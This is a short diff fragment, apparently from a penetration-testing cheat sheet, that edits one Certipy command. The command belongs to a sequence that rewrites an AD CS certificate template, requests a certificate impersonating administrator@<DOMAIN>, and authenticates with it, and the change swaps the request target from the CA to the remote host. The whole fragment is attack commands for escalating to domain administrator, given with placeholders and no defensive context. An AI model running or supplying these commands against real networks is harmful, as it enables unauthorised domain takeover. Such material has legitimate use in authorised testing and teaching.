@@ -4354,7 +4354,7 @@ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 
 ```c
 certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <RHOST> -template <TEMPLATE> -upn administrator@<DOMAIN>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
